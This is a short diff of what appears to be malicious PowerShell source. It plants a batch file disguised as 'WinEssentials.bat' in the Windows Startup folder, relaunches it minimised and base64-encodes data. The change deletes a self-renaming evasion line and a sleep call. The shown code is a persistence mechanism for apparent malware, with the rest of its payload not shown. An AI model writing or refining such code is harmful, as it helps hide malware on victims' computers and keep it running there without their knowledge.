@@ -13,9 +13,6 @@ cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
 New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
 @echo off
-
-ren %~f0 "%random%.bat"
-
 if "%1"=="done" goto runtime
 start "" /min %0 done
 exit
@@ -64,5 +61,4 @@ $encoded = [Convert]::ToBase64String($Bytes)
 $ps = $s;
 
 }
-Sleep-Start -m 100
 }
